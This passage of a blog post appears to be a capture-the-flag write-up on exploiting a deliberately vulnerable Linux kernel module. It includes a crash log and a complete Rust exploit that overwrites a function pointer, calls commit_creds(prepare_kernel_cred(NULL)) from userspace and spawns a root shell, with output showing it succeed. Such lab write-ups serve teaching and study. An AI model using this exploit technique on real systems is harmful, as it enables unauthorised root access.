</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.023392<span style="color:#f92672">]</span> *pde <span style="color:#f92672">=</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.023394<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.029519<span style="color:#f92672">]</span> Oops: <span style="color:#ae81ff">0000</span> <span style="color:#f92672">[</span><span style="color:#75715e">#1] SMP</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.032706<span style="color:#f92672">]</span> Modules linked in: basic1_ch1<span style="color:#f92672">(</span>O<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.037291<span style="color:#f92672">]</span> CPU: <span style="color:#ae81ff">0</span> PID: <span style="color:#ae81ff">1050</span> Comm: exploit Tainted: G           O    4.10.3 <span style="color:#75715e">#4</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.044501<span style="color:#f92672">]</span> Hardware name: QEMU Standard PC <span style="color:#f92672">(</span>i440FX + PIIX, 1996<span style="color:#f92672">)</span>, BIOS 1.10.2-1ubuntu1 04/01/2014
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.054875<span style="color:#f92672">]</span> task: c2bbabc0 task.stack: c2900000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.061686<span style="color:#f92672">]</span> EIP: 0x41414141
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.066930<span style="color:#f92672">]</span> EFLAGS: <span style="color:#ae81ff">00010296</span> CPU: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.073703<span style="color:#f92672">]</span> EAX: c2ac4540 EBX: c2ac4540 ECX: <span style="color:#ae81ff">00000004</span> EDX: bfa09fe8
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.084471<span style="color:#f92672">]</span> ESI: bfa09fe8 EDI: <span style="color:#ae81ff">00000004</span> EBP: c2901eec ESP: c2901ed8
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.095701<span style="color:#f92672">]</span>  DS: 007b ES: 007b FS: 00d8 GS: <span style="color:#ae81ff">0033</span> SS: <span style="color:#ae81ff">0068</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.105140<span style="color:#f92672">]</span> CR0: <span style="color:#ae81ff">80050033</span> CR2: <span style="color:#ae81ff">41414141</span> CR3: 0290a000 CR4: <span style="color:#ae81ff">00000690</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.116913<span style="color:#f92672">]</span> Call Trace:
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.121776<span style="color:#f92672">]</span>  ? tostring_read+0x2d/0x40 <span style="color:#f92672">[</span>basic1_ch1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.130786<span style="color:#f92672">]</span>  ? tostring_open+0x20/0x20 <span style="color:#f92672">[</span>basic1_ch1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.140015<span style="color:#f92672">]</span>  __vfs_read+0x24/0x110
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.146076<span style="color:#f92672">]</span>  ? rw_verify_area+0x5c/0x120
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.153662<span style="color:#f92672">]</span>  vfs_read+0x76/0x140
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.159884<span style="color:#f92672">]</span>  SyS_read+0x39/0x90
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.166064<span style="color:#f92672">]</span>  do_fast_syscall_32+0x85/0x150
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.174031<span style="color:#f92672">]</span>  entry_SYSENTER_32+0x47/0x71
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.181482<span style="color:#f92672">]</span> EIP: 0xb776dcc5
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.186867<span style="color:#f92672">]</span> EFLAGS: <span style="color:#ae81ff">00000292</span> CPU: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.193362<span style="color:#f92672">]</span> EAX: ffffffda EBX: <span style="color:#ae81ff">00000003</span> ECX: bfa09fe8 EDX: <span style="color:#ae81ff">00000004</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.204696<span style="color:#f92672">]</span> ESI: <span style="color:#ae81ff">00000000</span> EDI: <span style="color:#ae81ff">00000000</span> EBP: <span style="color:#ae81ff">00000000</span> ESP: bfa09f44
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.216088<span style="color:#f92672">]</span>  DS: 007b ES: 007b FS: <span style="color:#ae81ff">0000</span> GS: <span style="color:#ae81ff">0033</span> SS: 007b
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.226188<span style="color:#f92672">]</span> Code:  Bad EIP value.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.232677<span style="color:#f92672">]</span> EIP: 0x41414141 SS:ESP: 0068:c2901ed8
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.241635<span style="color:#f92672">]</span> CR2: <span style="color:#ae81ff">0000000041414141</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.248291<span style="color:#f92672">]</span> ---<span style="color:#f92672">[</span> end trace 90f382dd3902791d <span style="color:#f92672">]</span>---
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.256918<span style="color:#f92672">]</span> Kernel panic - not syncing: Fatal exception
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.268806<span style="color:#f92672">]</span> Kernel Offset: disabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  300.275348<span style="color:#f92672">]</span> Rebooting in <span style="color:#ae81ff">1</span> seconds..
</span></span></code></pre></div><h3 id="crafting-the-exploit">Crafting the exploit<a href="#crafting-the-exploit" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Previously, we saw a bug in the target LKM that would allow an attacker to overwrite a function pointer used by the module, and then trigger a call to this function pointer.</p>
<p>From this we can infer that the target kernel function will be called with the arguments for <code>tostring_read</code>. It can be problematic for calling specific functions, but in our case, some security protections (<strong>SMAP</strong> &amp; <strong>SMEP</strong>) are not enabled, meaning we can try to exploit another way (which is simplier).</p>
<h4 id="executing-code">Executing code<a href="#executing-code" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<p>Instead of trying to divert control flow to <strong>kernel functions</strong>, or <strong>ROP</strong> into kernel memory, we could just write a userspace function that performs the privilege escalation logic and uses addresses of kernel functions. As SMEP isn&rsquo;t enabled, kernel will <strong>jump to userspace and execute code</strong>.</p>
<h4 id="escalating-privilege-from-kernel">Escalating privilege from kernel<a href="#escalating-privilege-from-kernel" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<p>When a userspace program wants to escalate its privilege to root by exploiting the kernel, it can achieve it by changing it&rsquo;s credentials to root (uid=0 and gid=0).</p>
<p>Changing a process credentials inside the kernel is typically done by calling <code>commit_creds</code> function with a <code>struct cred</code> parameter initialized to zero (representing credentials of user root).</p>
<p>Getting a pointer to a root credentials structure is as simple as calling <code>prepare_kernel_cred(NULL)</code>. This works only on linux kernel versions older than <code>6.2.0</code>, because the kernel was defaulting the credentials to the init process credentials (pid 1, likely root) in case no argument was provided to the <code>prepare_kernel_cred</code> function.
You can see the <a href="https://github.com/torvalds/linux/commit/5a17f040fa332e71a45ca9ff02d6979d9176a423">commit</a> removing this behavior from the linux kernel (new exploits now need to directly write the <code>task_struct</code> of current process to modify credentials)</p>
<p>For simplicity, we will stick to the older kernels exploit style: <code>commit_creds(prepare_kernel_cred(NULL))</code></p>
<h4 id="getting-kernel-functions-adresses">Getting kernel functions adresses<a href="#getting-kernel-functions-adresses" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<p>The kernel directly exposes the kernel functions adresses in the <code>/proc/kallsyms</code> file (even for non root user), meaning we do not need to leak a pointer from kernel space.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /proc/kallsyms | grep prepare_kernel_cred
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0000000000000000 T prepare_kernel_cred</span>
</span></span><span style="display:flex;"><span>$ cat /proc/kallsyms | grep commit_creds
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0000000000000000 T commit_creds</span>
</span></span></code></pre></div><h3 id="getting-root">Getting root<a href="#getting-root" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Piecing all of this together, we modify the previous script to exploit the vulnerability and get a root shell :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> std::{
</span></span><span style="display:flex;"><span>    arch::asm,
</span></span><span style="display:flex;"><span>    fs::OpenOptions,
</span></span><span style="display:flex;"><span>    io::{Read, Write},
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">TOSTRING_STACK_SIZE</span>: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">PREPARE_KERNEL_CRED_EA</span>: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc10711f0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">COMMIT_CREDS_EA</span>: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc1070e80</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">escalate_privileges</span>() -&gt; <span style="color:#66d9ef">isize</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsafe</span> {
</span></span><span style="display:flex;"><span>        asm!(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;xor eax, eax&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;call ebx&#34;</span>, <span style="color:#75715e">// syscall abi (takes args from eax, ecx, edx)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#e6db74">&#34;call edi&#34;</span>, <span style="color:#75715e">// same
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">in</span>(<span style="color:#e6db74">&#34;ebx&#34;</span>) <span style="color:#66d9ef">PREPARE_KERNEL_CRED_EA</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">in</span>(<span style="color:#e6db74">&#34;edi&#34;</span>) <span style="color:#66d9ef">COMMIT_CREDS_EA</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    println!(<span style="color:#e6db74">&#34;[-] @prepare_kernel_cred = 0x</span><span style="color:#e6db74">{:x}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">PREPARE_KERNEL_CRED_EA</span>);
</span></span><span style="display:flex;"><span>    println!(<span style="color:#e6db74">&#34;[-] @commit_creds = 0x</span><span style="color:#e6db74">{:x}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">COMMIT_CREDS_EA</span>);
</span></span><span style="display:flex;"><span>    println!(<span style="color:#e6db74">&#34;[?] Check out function addresses in /proc/kallsyms&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> intval: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> tostring_read_override_ea: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> escalate_privileges <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> dev <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span> OpenOptions::new()
</span></span><span style="display:flex;"><span>        .read(<span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>        .write(<span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>        .open(<span style="color:#e6db74">&#34;/dev/tostring&#34;</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        Ok(f) <span style="color:#f92672">=&gt;</span> f,
</span></span><span style="display:flex;"><span>        Err(e) <span style="color:#f92672">=&gt;</span> {
</span></span><span style="display:flex;"><span>            eprintln!(<span style="color:#e6db74">&#34;Failed to open /dev/tostring: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, e);
</span></span><span style="display:flex;"><span>            std::process::exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    println!(<span style="color:#e6db74">&#34;[*] Filling stack&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">..</span><span style="color:#66d9ef">TOSTRING_STACK_SIZE</span> {
</span></span><span style="display:flex;"><span>        dev.write_all(<span style="color:#f92672">&amp;</span>intval.to_le_bytes())
</span></span><span style="display:flex;"><span>            .expect(<span style="color:#e6db74">&#34;Failed to write to /dev/tostring to override stack&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    println!(<span style="color:#e6db74">&#34;[*] Overriding function pointer&#34;</span>);
</span></span><span style="display:flex;"><span>    dev.write_all(<span style="color:#f92672">&amp;</span>tostring_read_override_ea.to_le_bytes())
</span></span><span style="display:flex;"><span>        .expect(<span style="color:#e6db74">&#34;Failed to write to /dev/tostring to override function pointer&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> ret <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span><span style="color:#66d9ef">u8</span>; size_of::<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">usize</span><span style="color:#f92672">&gt;</span>()];
</span></span><span style="display:flex;"><span>    println!(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;[*] Triggering vuln. Should call our injected function pointer (ea=0x</span><span style="color:#e6db74">{:x}</span><span style="color:#e6db74">)&#34;</span>,
</span></span><span style="display:flex;"><span>        escalate_privileges <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> _ <span style="color:#f92672">=</span> dev.read_exact(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> ret);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">unsafe</span> { libc::getuid() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> libc::getgid() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> } {
</span></span><span style="display:flex;"><span>        println!(<span style="color:#e6db74">&#34;[+] Got root ! Spawning shell...&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> child <span style="color:#f92672">=</span> std::process::Command::new(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>).spawn().unwrap();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        child.wait().unwrap();
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        eprintln!(<span style="color:#e6db74">&#34;[!] Failed to get root&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Upload the binary to the shared folder of the QEMU VM, and run it. We got a root shell !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Root-Me user@linkern-chall:~$ ./exploit 
</span></span><span style="display:flex;"><span>[-] @prepare_kernel_cred = 0xc10711f0
</span></span><span style="display:flex;"><span>[-] @commit_creds = 0xc1070e80
</span></span><span style="display:flex;"><span>[?] Check out function addresses in /proc/kallsyms
</span></span><span style="display:flex;"><span>[*] Filling stack
</span></span><span style="display:flex;"><span>[*] Overriding function pointer
</span></span><span style="display:flex;"><span>[*] Triggering vuln. Should call our injected function pointer (ea=0x804b250)
</span></span><span style="display:flex;"><span>[+] Got root ! Spawning shell...
</span></span><span style="display:flex;"><span>Root-Me root@linkern-chall:/home/user$ cat /passwd/passwd
</span></span><span style="display:flex;"><span>__FLAG__
</span></span></code></pre></div>
      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Read other posts</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="//localhost:1313/posts/pwn-linkern-rop/" class="button inline prev">
        Pwn: Linux Kernel x86 - Exploiting a Buffer Overflow with ROP
      </a>
    
    
      ::
    
    
      <a href="//localhost:1313/posts/pwn-dvar/" class="button inline next">
        PWN: Exploiting Vulnerable ARM Router
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
